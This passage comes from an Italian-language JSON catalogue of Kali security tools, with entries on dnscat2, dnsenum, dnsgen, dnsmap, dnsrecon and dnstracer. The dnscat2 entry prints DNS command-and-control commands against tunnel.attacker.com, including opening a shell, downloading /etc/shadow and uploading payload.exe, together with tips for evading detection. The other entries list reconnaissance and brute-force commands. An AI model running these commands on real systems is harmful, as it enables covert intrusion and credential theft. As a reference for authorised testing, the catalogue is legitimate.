    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dnscat2</strong> e un framework completo di Command and Control (C2) che opera interamente attraverso il protocollo DNS, progettato specificamente per ambienti di rete altamente restrittivi dove il traffico HTTP, HTTPS e altri protocolli sono bloccati ma le query DNS sono ancora permesse. Questa condizione e sorprendentemente comune poiche il DNS e fondamentale per il funzionamento della rete e raramente viene bloccato completamente. Dnscat2 fornisce funzionalita C2 complete incluse shell interattive, trasferimento file bidirezionale, port forwarding e gestione di sessioni multiple, il tutto incapsulato in query e risposte DNS dall'aspetto legittimo. Il framework e composto da un server scritto in Ruby che funge da controller e un client scritto in C compilabile per Windows, Linux e macOS, offrendo flessibilita cross-platform per operazioni red team.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Shell interattiva e tunneling via DNS:</strong> Dnscat2 permette di ottenere shell di comando complete sul sistema compromesso, con tutto il traffico I/O che transita esclusivamente attraverso query DNS. Supporta sia modalita command (con comandi strutturati come upload, download, exec) sia modalita console (shell interattiva raw). Il tunneling DNS utilizza diversi tipi di record (A, AAAA, CNAME, MX, TXT) per massimizzare la larghezza di banda e adattarsi alle restrizioni specifiche dell'ambiente.</p><p><strong>Crittografia end-to-end e autenticazione:</strong> Tutto il traffico dnscat2 e cifrato per impostazione predefinita utilizzando un protocollo proprietario che impedisce l'ispezione del contenuto anche a chi ha visibilita sulle query DNS. Il server genera una chiave segreta condivisa che il client deve conoscere per stabilire la connessione, prevenendo hijacking della sessione da parte di terzi. Questa crittografia e fondamentale poiche il traffico DNS transita in chiaro attraverso i resolver intermedi.</p><p><strong>Port forwarding e gestione sessioni multiple:</strong> Dnscat2 supporta port forwarding bidirezionale attraverso il tunnel DNS, permettendo di raggiungere servizi sulla rete interna del target che non sarebbero altrimenti accessibili. Il server gestisce sessioni multiple simultanee, permettendo di controllare diversi host compromessi da una singola console con la possibilita di passare da una sessione all'altra in modo interattivo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'operatore deve configurare un dominio con i record NS che puntano al server dnscat2, in modo che le query per quel dominio vengano instradate al server C2. Il client sul target effettua query DNS verso quel dominio per stabilire il canale di comunicazione.</p><pre><code># Configurazione DNS (sul registrar del dominio)\n# tunnel.attacker.com NS ns1.attacker.com\n# ns1.attacker.com A [IP del server dnscat2]\n\n# Avvio server (attacker)\nruby dnscat2.rb tunnel.attacker.com --secret=mysecretkey\n\n# Avvio client (target - Linux)\n./dnscat --dns server=tunnel.attacker.com --secret=mysecretkey\n\n# Avvio client (target - Windows)\ndnscat2.exe --dns server=tunnel.attacker.com --secret=mysecretkey\n\n# Interazione dal server\ndnscat2> sessions\ndnscat2> session -i 1\ncommand (target)> shell\ncommand (target)> download /etc/shadow\ncommand (target)> upload payload.exe c:\\temp\\payload.exe\ncommand (target)> listen 127.0.0.1:8080 10.0.0.5:80</code></pre><p>Il comando <code>listen</code> crea un port forward che permette di accedere al servizio sulla porta 80 dell'host 10.0.0.5 della rete interna attraverso la porta locale 8080.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In operazioni <strong>Red Team</strong>, dnscat2 e la soluzione ideale quando l'egress filtering del target blocca tutto il traffico in uscita tranne le query DNS: una condizione comune in reti corporate con firewall restrittivi ma che permettono la risoluzione DNS verso Internet. Come <strong>canale C2 di backup</strong>, dnscat2 puo essere pre-configurato come fallback nel caso in cui il canale C2 primario (HTTP/HTTPS) venga identificato e bloccato dal blue team, garantendo la persistenza dell'accesso. Per il <strong>pivoting in reti segmentate</strong>, il port forwarding via DNS permette di raggiungere segmenti di rete interni senza stabilire connessioni dirette che sarebbero piu facilmente rilevabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il DNS tunneling genera un volume anomalo di query DNS verso un singolo dominio con pattern riconoscibili: query con payload lunghi codificati in base32/hex nei nomi di sottodominio, risposte TXT di grandi dimensioni e frequenza di query insolitamente alta. I SOC moderni e le soluzioni di DNS security monitoring (Cisco Umbrella, Infoblox) hanno signature specifiche per rilevare dnscat2.</p><p><strong>Impatto operativo:</strong> La larghezza di banda attraverso DNS e intrinsecamente limitata (tipicamente pochi KB/s), rendendo le operazioni di trasferimento file lente. Shell interattive possono risultare laggose. La dipendenza dalla configurazione DNS del dominio richiede infrastruttura dedicata con dominio e server.</p><p><strong>Mitigazioni:</strong> Utilizzare la modalita con dominio autoritativo piuttosto che query dirette per apparire piu legittimo. Limitare il volume di traffico e la frequenza delle query. Combinare con tecniche di domain fronting dove possibile. Considerare alternative come iodine per tunnel piu semplici o DNSStager per delivery di payload via DNS.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "dnsenum",
    "name": "dnsenum",
    "version": "1.3.2",
    "icon": "../app/icons/dnsenum-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsenum/",
    "desc": "Enumerazione DNS: zone transfer, brute force subdomain, reverse lookup.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSenum</strong> e uno script Perl completo per la raccolta esaustiva di informazioni DNS relative a un dominio target. Lo strumento automatizza diverse tecniche di enumerazione DNS in un singolo workflow: tentativi di zone transfer (AXFR) su tutti i nameserver del dominio, brute forcing di sottodomini utilizzando wordlist configurabili, reverse DNS lookup sui netblock IP identificati, ricerca di sottodomini indicizzati su Google e raccolta di informazioni sui record DNS standard (A, AAAA, MX, NS, SOA, TXT). DNSenum e uno dei tool storici per la reconnaissance DNS nella community di penetration testing, presente in Kali Linux fin dalle prime versioni. La sua completezza nel coprire diverse tecniche di enumerazione in un singolo passaggio lo rende ancora utile come punto di partenza per la fase di information gathering, sebbene tool piu moderni offrano prestazioni e copertura superiori.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Zone Transfer automatico (AXFR):</strong> DNSenum identifica automaticamente tutti i nameserver autoritativi del dominio target e tenta un zone transfer su ciascuno di essi. Un zone transfer riuscito rivela l'intera zona DNS del dominio, inclusi tutti i record di ogni tipo, fornendo una mappa completa dell'infrastruttura. Sebbene i zone transfer siano raramente permessi su target moderni, quando funzionano rappresentano la singola fonte di informazione piu preziosa nella reconnaissance DNS.</p><p><strong>Brute force sottodomini con wordlist:</strong> Lo strumento testa sistematicamente nomi di sottodomini da una wordlist configurabile, risolvendo ciascuno per identificare quelli attivi. La wordlist di default copre i nomi piu comuni (www, mail, ftp, admin, dev, staging, test, vpn, api), ma puo essere sostituita con dizionari piu estesi come quelli inclusi in SecLists per una copertura maggiore.</p><p><strong>Reverse lookup e Google scraping:</strong> Dopo aver identificato gli indirizzi IP associati al dominio, DNSenum esegue reverse DNS lookup sull'intero netblock (tipicamente /24) per scoprire altri hostname che condividono la stessa infrastruttura. Inoltre, interroga Google per trovare sottodomini che sono stati indicizzati dal motore di ricerca, una tecnica di OSINT passiva che non genera traffico verso il target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DNSenum si esegue da riga di comando con il dominio target come argomento principale. Diverse opzioni permettono di personalizzare il comportamento dello scan, dalla scelta della wordlist al numero di thread e ai parametri di Google scraping.</p><pre><code># Enumerazione completa con tutte le tecniche\ndnsenum target.com\n\n# Con wordlist personalizzata e output su file\ndnsenum --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o results.xml target.com\n\n# Thread multipli per velocizzare il brute force\ndnsenum --threads 20 --enum target.com\n\n# Limitare le pagine Google e i risultati reverse\ndnsenum --pages 5 --scrap 20 -r target.com\n\n# Solo zone transfer senza brute force\ndnsenum --noreverse -f /dev/null target.com</code></pre><p>L'output include record NS, MX, A e altri record DNS standard, risultati del zone transfer (se riuscito), sottodomini trovati tramite brute force e reverse lookup, e sottodomini trovati tramite Google.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Reconnaissance</strong> di un penetration test, DNSenum fornisce un buon punto di partenza per mappare l'infrastruttura DNS del target con un singolo comando che copre multiple tecniche. Quando un <strong>zone transfer AXFR</strong> ha successo (raro ma ancora possibile su sistemi mal configurati), rivela l'intera infrastruttura DNS in un colpo solo, rendendo superflue tutte le altre tecniche di subdomain enumeration. Per <strong>formazione e certificazioni</strong> come OSCP, DNSenum e un tool classico che illustra le tecniche fondamentali di DNS enumeration ed e frequentemente utilizzato in laboratori ed esami pratici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I tentativi di zone transfer sono facilmente rilevabili e vengono comunemente loggati dai nameserver. Il brute forcing di sottodomini genera un volume significativo di query DNS verso i nameserver autoritativi del target che puo essere rilevato tramite monitoring DNS. Le query a Google possono essere soggette a CAPTCHA e rate limiting.</p><p><strong>Impatto operativo:</strong> Il brute force con wordlist grandi e thread elevati puo causare carico significativo sui nameserver del target. Le query reverse lookup su interi netblock generano traffico aggiuntivo verso i nameserver responsabili delle zone reverse.</p><p><strong>Mitigazioni:</strong> Per reconnaissance piu discreta, utilizzare prima tecniche passive (subfinder, amass passive mode, SecurityTrails API) che non generano traffico verso il target. Limitare il numero di thread e aggiungere delay tra le query per ridurre il footprint. I tool moderni come Amass offrono integrazione con dozzine di fonti passive prima di ricorrere a tecniche attive.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnsgen",
    "name": "dnsgen",
    "version": "1.0.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsgen/",
    "desc": "Genera permutazioni di subdomain da wordlist esistenti per discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSgen</strong> e un tool Python specializzato nella generazione intelligente di permutazioni di sottodomini a partire da una lista esistente di domini gia scoperti. A differenza del semplice brute forcing con wordlist, DNSgen analizza i pattern nei sottodomini conosciuti ed estrae parole chiave, numeri e strutture ricorrenti per generare varianti che hanno alta probabilita di esistere. Ad esempio, se nella lista iniziale sono presenti <code>api-v1.target.com</code> e <code>staging.target.com</code>, DNSgen generera combinazioni come <code>api-v2.target.com</code>, <code>api-staging.target.com</code>, <code>staging-v1.target.com</code> e molte altre varianti basate sui pattern identificati. Questo approccio e significativamente piu efficace del brute forcing puro perche genera candidati contestualizzati alla naming convention specifica dell'organizzazione target. DNSgen e progettato per integrarsi nella pipeline di subdomain enumeration, ricevendo input da tool come subfinder o amass e passando l'output a resolver veloci come massdns o dnsx per la verifica.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Motore di permutazione basato su pattern:</strong> DNSgen applica diverse strategie di permutazione: inserimento di numeri incrementali (v1, v2, v3), aggiunta di prefissi e suffissi comuni (dev-, -staging, -prod, -test, -internal), sostituzione di parole tra sottodomini diversi e combinazione di segmenti estratti dalla lista iniziale. Questo approccio contestuale genera candidati molto piu mirati rispetto a una wordlist generica.</p><p><strong>Estrazione automatica di parole chiave:</strong> Il tool analizza automaticamente i sottodomini in input per estrarre parole significative, numeri e pattern strutturali. Queste parole estratte vengono poi utilizzate come base per le permutazioni, garantendo che le varianti generate riflettano la naming convention effettiva dell'organizzazione target piuttosto che nomi generici.</p><p><strong>Integrazione pipeline e wordlist personalizzate:</strong> DNSgen legge da stdin e scrive su stdout, rendendolo perfettamente integrabile nelle pipeline Unix con altri tool di subdomain enumeration. Supporta wordlist aggiuntive tramite il flag <code>-w</code> per arricchire le permutazioni con termini specifici del contesto (nomi di servizi, tecnologie, ambienti). L'output puo essere direttamente piped a resolver come massdns o dnsx per la verifica immediata dei candidati generati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il workflow tipico prevede una prima fase di subdomain enumeration con tool passivi, seguita dalla generazione di permutazioni con DNSgen e infine la risoluzione dei candidati con un resolver veloce per identificare quelli effettivamente attivi.</p><pre><code># Pipeline base: genera permutazioni da lista esistente\ncat known_subdomains.txt | dnsgen - > permutations.txt\n\n# Con wordlist personalizzata per termini specifici del target\ncat known_subdomains.txt | dnsgen -w custom_words.txt - > permutations.txt\n\n# Pipeline completa con massdns per risoluzione veloce\ncat subs.txt | dnsgen - | massdns -r resolvers.txt -t A -o S -w resolved.txt\n\n# Pipeline con dnsx (alternativa a massdns)\ncat subs.txt | dnsgen - | dnsx -silent -o new_subdomains.txt\n\n# Workflow completo di subdomain enumeration\nsubfinder -d target.com -silent > subs.txt\ncat subs.txt | dnsgen - | dnsx -silent >> subs.txt\nsort -u subs.txt -o subs_final.txt</code></pre><p>E consigliabile rimuovere i duplicati dall'output finale poiche DNSgen puo generare candidati gia presenti nella lista iniziale o duplicati tra le diverse strategie di permutazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Discovery avanzata</strong>, DNSgen amplifica significativamente i risultati ottenuti da subfinder, amass e altre fonti passive, scoprendo sottodomini che non sono presenti in nessun database pubblico ma seguono la naming convention dell'organizzazione. Nel <strong>Bug Bounty</strong>, trovare sottodomini che altri ricercatori hanno mancato puo rivelare asset dimenticati con vulnerabilita non ancora segnalate, come ambienti di staging esposti o vecchie versioni di API. Per la <strong>mappatura dell'attack surface</strong> in penetration test, le permutazioni contestuali permettono di identificare infrastruttura interna esposta accidentalmente come server di sviluppo, database di test e pannelli di amministrazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> DNSgen di per se non genera traffico di rete, poiche si limita a generare una lista di candidati. Tuttavia, la fase di risoluzione successiva (massdns, dnsx) genera un volume molto elevato di query DNS che puo raggiungere migliaia di richieste al secondo, facilmente rilevabile dai nameserver autoritativi del target.</p><p><strong>Impatto operativo:</strong> Il numero di permutazioni generate puo essere molto grande (decine o centinaia di migliaia di candidati), e la risoluzione di tutti richiede tempo e risorse. L'uso di resolver pubblici ad alto volume puo causare rate limiting o ban temporanei dagli stessi resolver.</p><p><strong>Mitigazioni:</strong> Utilizzare una lista diversificata di resolver pubblici per distribuire il carico e evitare rate limiting. Limitare la velocita di risoluzione per ridurre il footprint. Filtrare i candidati piu probabili prima della risoluzione per ridurre il volume totale di query.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnsmap",
    "name": "dnsmap",
    "version": "0.36",
    "icon": "../app/icons/dnsmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsmap/",
    "desc": "Brute force subdomain con wordlist per enumerare host nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSmap</strong> e uno strumento leggero e specializzato per il brute forcing di sottodomini, che testa sistematicamente nomi di sottodomini da una wordlist contro un dominio target per identificare host attivi. Sviluppato originariamente da pagvac nel 2006, e stato uno dei primi tool dedicati specificamente alla subdomain enumeration tramite brute force DNS. DNSmap funziona risolvendo ogni candidato sottodominio e verificando se ottiene una risposta valida dal DNS, distinguendo i risultati reali dai falsi positivi causati da DNS wildcard (risposte catch-all configurate da alcuni domini per rispondere a qualsiasi query di sottodominio). Lo strumento include una wordlist di default con i nomi di sottodomini piu comuni e supporta wordlist personalizzate per adattarsi a target specifici. Sebbene sia stato largamente superato da tool moderni piu veloci e con maggiori funzionalita, DNSmap rimane presente in Kali Linux come strumento storico e didattico per comprendere i fondamenti della subdomain enumeration.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Brute force con rilevamento wildcard:</strong> DNSmap include un meccanismo automatico per rilevare configurazioni DNS wildcard che potrebbero generare falsi positivi. Prima di iniziare il brute force, lo strumento risolve un sottodominio casuale inesistente: se ottiene una risposta, deduce la presenza di un wildcard e filtra i risultati corrispondenti a quell'indirizzo IP. Questo garantisce che solo i sottodomini con record DNS specifici vengano riportati come risultati validi.</p><p><strong>Wordlist integrata e personalizzabile:</strong> Lo strumento include una wordlist di default compilata con i nomi di sottodomini piu frequentemente incontrati in ambienti reali (www, mail, ftp, admin, webmail, smtp, pop, ns, test, dev, staging e centinaia di altri). L'utente puo sostituire la wordlist di default con una personalizzata per adattare lo scan al target specifico, utilizzando dizionari piu grandi come quelli disponibili in SecLists.</p><p><strong>Delay configurabile e output strutturato:</strong> DNSmap permette di configurare un delay in millisecondi tra una query e la successiva, utile per evitare di sovraccaricare il nameserver target o per ridurre la probabilita di rilevamento. I risultati possono essere salvati in formato CSV per l'analisi successiva, e lo strumento supporta la scansione batch di domini multipli tramite il tool companion <code>dnsmap-bulk</code>.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DNSmap si utilizza da riga di comando con il dominio target come argomento obbligatorio. Le opzioni permettono di personalizzare la wordlist, il delay tra le query e il formato di output.</p><pre><code># Scan con wordlist di default\ndnsmap target.com\n\n# Con wordlist personalizzata\ndnsmap target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# Con delay di 300ms tra le query per ridurre il footprint\ndnsmap target.com -d 300\n\n# Salvataggio risultati in formato CSV\ndnsmap target.com -r /tmp/results/ -c\n\n# Scansione batch di domini multipli\ndnsmap-bulk domains.txt /tmp/results/\n\n# Combinazione: wordlist custom, delay e output CSV\ndnsmap target.com -w custom.txt -d 200 -r results/ -c</code></pre><p>Il tool <code>dnsmap-bulk</code> accetta un file con un dominio per riga e salva i risultati in file separati per ciascun dominio, utile per scan su larga scala di target multipli.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Basic Subdomain Enumeration</strong>, DNSmap offre un punto di partenza semplice e immediato senza configurazione complessa, ideale per una prima ricognizione rapida su un target. Come strumento <strong>didattico e di formazione</strong>, illustra chiaramente il concetto di subdomain brute forcing e il problema dei DNS wildcard, rendendolo utile in corsi di sicurezza e laboratori pratici. In contesti di <strong>scansione batch</strong>, dnsmap-bulk permette di eseguire subdomain enumeration su liste di domini in modo automatizzato, utile per assessment di organizzazioni con molti domini registrati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query DNS generate dal brute forcing sono facilmente loggabili dai nameserver autoritativi del target. Il pattern di richieste sequenziali per sottodomini inesistenti (che generano risposte NXDOMAIN) e un indicatore chiaro di enumerazione in corso. Le soluzioni di DNS monitoring possono rilevare e bloccare questo tipo di attivita.</p><p><strong>Impatto operativo:</strong> Senza delay configurato, DNSmap genera query alla massima velocita consentita, che puo sovraccaricare nameserver poco performanti. La wordlist di default e relativamente piccola, ma wordlist estese generano migliaia di query che aumentano significativamente il footprint.</p><p><strong>Mitigazioni:</strong> Utilizzare il flag <code>-d</code> per impostare un delay adeguato tra le query e ridurre la velocita dello scan. Per reconnaissance moderna e discreta, preferire approcci passivi come subfinder, Amass in modalita passiva o query a SecurityTrails API che non generano traffico diretto verso il target. Combinare i risultati di fonti passive con brute force mirato solo per conferma.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnsrecon",
    "name": "dnsrecon",
    "version": "1.2.0",
    "icon": "../app/icons/dnsrecon-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsrecon/",
    "desc": "Ricognizione DNS completa: zone transfer, cache snoop, brute force, DNSSEC.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSrecon</strong> e uno degli strumenti di ricognizione DNS piu completi e versatili disponibili nel panorama della sicurezza informatica. Scritto interamente in Python da Andrew Blankenship (darkoperator), combina in un unico framework una vasta gamma di tecniche di enumerazione DNS: zone transfer (AXFR), brute force di sottodomini, reverse lookup, cache snooping, enumerazione DNSSEC tramite NSEC walking, query per record SPF, SOA, MX e molto altro. Il tool supporta output in formati multipli tra cui JSON, XML, CSV e database SQLite, rendendo semplice l'integrazione con pipeline di analisi automatizzate. La sua architettura modulare permette di selezionare tecniche specifiche o eseguire un'enumerazione completa con un singolo comando, rendendolo uno strumento indispensabile nella fase di Information Gathering di qualsiasi penetration test professionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Zone Transfer (AXFR):</strong> DNSrecon tenta automaticamente il trasferimento di zona su tutti i nameserver autoritativi individuati per il dominio target. Quando un server DNS e mal configurato e permette AXFR a host non autorizzati, questo rivela l'intera mappa dei record DNS della zona, inclusi host interni, record CNAME, alias e sottodomini non pubblicamente noti. Il tool gestisce anche zone transfer parziali e riporta errori specifici per ogni nameserver.</p><p><strong>Brute Force e Cache Snooping:</strong> La modalita brute force utilizza wordlist personalizzabili e thread multipli per scoprire sottodomini non documentati. Il tool include wordlist predefinite di alta qualita ma accetta dizionari custom per target specifici. La funzionalita di cache snooping verifica se un DNS resolver ha in cache determinati record, rivelando quali domini sono stati recentemente risolti dai client della rete target, fornendo intelligence sulle abitudini di navigazione e sui servizi utilizzati.</p><p><strong>DNSSEC Zone Walking e Google Enum:</strong> L'enumerazione DNSSEC sfrutta i record NSEC (Next Secure) per camminare attraverso l'intera zona DNS in modo deterministico, bypassando la necessita di brute force. Questa tecnica e particolarmente efficace su domini che implementano DNSSEC senza NSEC3. Inoltre, la modalita Google enumeration utilizza Google dorking per scoprire sottodomini indicizzati dai motori di ricerca, aggiungendo un ulteriore livello di coverage alla ricognizione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DNSrecon si utilizza da riga di comando specificando il dominio target e la modalita di enumerazione desiderata. Nella pratica professionale si esegue prima una scansione standard per ottenere una panoramica, poi si approfondisce con tecniche specifiche in base ai risultati ottenuti.</p><pre><code># Enumerazione standard completa di tutti i record\ndnsrecon -d target.com\n\n# Tentativo di zone transfer su tutti i nameserver\ndnsrecon -d target.com -t axfr\n\n# Brute force sottodomini con wordlist custom e 20 thread\ndnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt --threads 20\n\n# DNSSEC zone walking per enumerazione completa\ndnsrecon -d target.com -t zonewalk\n\n# Cache snooping su un resolver specifico\ndnsrecon -t snoop -n 10.0.0.1 -D domain_list.txt\n\n# Output completo in formato JSON per post-processing\ndnsrecon -d target.com -j output.json --xml report.xml</code></pre><p>E buona pratica combinare i risultati di tecniche diverse per massimizzare la copertura. I risultati in formato JSON possono essere importati direttamente in strumenti come Maltego o processati con script custom per correlazione con altri dati di ricognizione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Reconnaissance</strong> di un penetration test, DNSrecon e il tool di riferimento per ottenere una mappa completa dell'infrastruttura DNS del target. La combinazione di brute force, AXFR e DNSSEC walking massimizza le probabilita di scoprire sottodomini nascosti, server di staging, ambienti di sviluppo e altri asset non intenzionalmente esposti.</p><p>Per l'<strong>analisi DNSSEC</strong>, il zone walking permette di enumerare completamente domini che utilizzano NSEC senza hashing, rivelando l'intera struttura della zona senza necessita di indovinare i nomi dei record. Questo e particolarmente utile contro organizzazioni che implementano DNSSEC in modo incompleto.</p><p>Nel contesto di <strong>audit infrastrutturali</strong> su reti on-premise, DNSrecon verifica la corretta configurazione dei server DNS interni, controlla che i zone transfer siano limitati ai server autorizzati, e identifica potenziali information disclosure attraverso record DNS troppo descrittivi o zone mal segmentate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query DNS multiple generate dal brute force sono facilmente registrabili dai log dei server DNS e dai sistemi SIEM. I tentativi di zone transfer (AXFR) vengono quasi sempre loggati e spesso generano alert automatici, poiche rappresentano un'anomalia evidente nell'uso normale del protocollo DNS. Anche il cache snooping puo essere rilevato se il resolver implementa rate limiting o monitoring.</p><p><strong>Impatto operativo:</strong> Un brute force aggressivo con thread elevati puo causare un carico significativo sul server DNS target, potenzialmente degradando il servizio per gli utenti legittimi. Su infrastrutture con rate limiting DNS, le query potrebbero essere bloccate o rallentate, rendendo l'enumerazione incompleta e allo stesso tempo rivelando l'attivita di ricognizione.</p><p><strong>Mitigazioni:</strong> Utilizzare un resolver DNS intermedio per mascherare l'origine delle query. Ridurre il numero di thread e introdurre delay tra le query per evitare pattern di traffico sospetti. Preferire tecniche passive (Google enum, certificate transparency logs) prima di passare a tecniche attive. Distribuire le query su periodi di tempo prolungati per mimetizzarsi nel traffico DNS normale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnstracer",
    "name": "dnstracer",
    "version": "1.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnstracer/",
    "desc": "Traccia la catena di risoluzione DNS dai root server al target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNStracer</strong> e uno strumento diagnostico specializzato che traccia l'intero percorso di risoluzione DNS partendo dai root server fino al nameserver autoritativo finale per un dato dominio. A differenza di una semplice query DNS che restituisce solo il risultato finale, DNStracer mostra ogni singolo hop nella catena di delega, identificando tutti i nameserver intermedi coinvolti nel processo di risoluzione. Questo approccio fornisce una visione completa dell'infrastruttura DNS associata a un dominio, rivelando relazioni di delega, nameserver condivisi, potenziali single point of failure e configurazioni problematiche. Il tool e particolarmente utile sia per il debugging di problemi DNS che per la ricognizione dell'infrastruttura target durante un penetration test.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Delegation Chain Tracing:</strong> DNStracer segue l'intera catena di delega DNS partendo dai root server (o da un server specificato dall'utente) fino al nameserver autoritativo per il dominio richiesto. Per ogni hop nella catena, mostra il nameserver consultato, la risposta ricevuta e il referral al livello successivo. Questo permette di visualizzare esattamente come il sistema DNS globale risolve un determinato nome, identificando tutti gli attori coinvolti nel processo.</p><p><strong>Query Analysis e Record Types:</strong> Il tool supporta query per diversi tipi di record DNS (A, MX, NS, CNAME, SOA e altri), permettendo di tracciare il percorso di risoluzione specifico per ciascun tipo. L'output dettagliato include informazioni su TTL, glue record, referral e risposte autoritative vs non-autoritative, fornendo un quadro completo del comportamento del sistema DNS per ogni tipo di query.</p><p><strong>Configurazione Avanzata e Retry Logic:</strong> DNStracer offre opzioni per controllare il comportamento delle query, inclusi timeout personalizzabili, numero di retry per server non raggiungibili, e la possibilita di specificare un server di partenza alternativo ai root server. La modalita verbose fornisce dettagli aggiuntivi su ogni interazione con i nameserver, utili per diagnosticare problemi di configurazione DNS complessi o intermittenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DNStracer si utilizza da linea di comando specificando il dominio da tracciare e opzionalmente il tipo di record e le opzioni di configurazione. L'output mostra la catena completa di risoluzione con tutti i nameserver coinvolti.</p><pre><code># Traccia base della risoluzione DNS\ndnstracer target.com\n\n# Traccia risoluzione record MX\ndnstracer -q MX target.com\n\n# Output verbose con 3 retry per server\ndnstracer -v -r 3 target.com\n\n# Partenza da un root server specifico\ndnstracer -s a.root-servers.net target.com\n\n# Query record NS con timeout personalizzato\ndnstracer -q NS -t 5 target.com\n\n# Traccia record SOA per analisi zona\ndnstracer -q SOA target.com</code></pre><p>Analizzando l'output di DNStracer, si possono identificare nameserver condivisi tra piu domini (utile per pivot), configurazioni di delega asimmetriche, e potenziali punti deboli nell'infrastruttura DNS del target. I risultati sono complementari a quelli ottenuti con strumenti come dig e nslookup.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>DNS Debugging</strong> professionale, DNStracer e fondamentale per identificare esattamente dove nella catena di risoluzione si verifica un problema. Quando un dominio non risolve correttamente, il tool mostra se il problema risiede nella delega dal TLD, in un nameserver intermedio non raggiungibile, o in una configurazione errata del server autoritativo. Questo livello di dettaglio e essenziale per risolvere rapidamente problemi di risoluzione DNS complessi.</p><p>Nell'<strong>Infrastructure Analysis</strong> durante un penetration test, DNStracer rivela la catena completa di nameserver utilizzati dal target, identificando provider DNS, nameserver condivisi con altri domini, e la struttura gerarchica dell'infrastruttura DNS. Queste informazioni possono rivelare relazioni tra organizzazioni, identificare servizi di hosting DNS utilizzati, e fornire punti di partenza per ulteriore ricognizione.</p><p>Per il <strong>DNS Hijacking Assessment</strong>, il tool permette di verificare l'integrita della catena di delega e identificare potenziali punti dove un attaccante potrebbe inserirsi tramite compromissione di un nameserver intermedio o manipolazione dei record di delega.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> DNStracer genera query DNS standard che seguono il normale processo di risoluzione ricorsiva. Poiche le query partono dai root server e seguono la catena di delega, il traffico appare indistinguibile da una risoluzione DNS legittima. Il volume di query e minimo, tipicamente una decina di query per traccia completa, rendendo lo strumento a basso profilo.</p><p><strong>Impatto operativo:</strong> L'impatto sul target e trascurabile poiche le query sono identiche a quelle generate da qualsiasi resolver DNS durante la normale risoluzione. Non vengono effettuate query anomale, zone transfer o brute force. L'unica traccia e una singola query al nameserver autoritativo del target per il record richiesto.</p><p><strong>Mitigazioni:</strong> Nonostante il basso profilo intrinseco, e comunque consigliabile utilizzare un resolver DNS intermedio per evitare che l'IP dell'operatore appaia nei log del nameserver autoritativo del target. Per operazioni particolarmente sensibili, le query possono essere distribuite nel tempo per evitare qualsiasi correlazione temporale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnstwist",
    "name": "dnstwist",
    "version": "0~20250130",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
